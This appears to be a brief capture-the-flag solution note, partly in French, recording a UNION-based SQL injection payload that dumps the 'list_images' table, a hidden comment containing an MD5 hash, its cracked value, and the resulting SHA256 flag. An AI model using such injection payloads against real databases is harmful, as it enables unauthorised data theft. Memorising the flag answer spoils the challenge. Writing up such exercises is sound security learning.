table: list_images
columns: id, url, title, comment
5 union all select 1,concat(id,0x3a,url,0x3a,title,0x3a,comment) from Member_images.list_images
Dans les commentaires on trouve: "If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"
-> albatroz
SHA256(albatroz) = f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

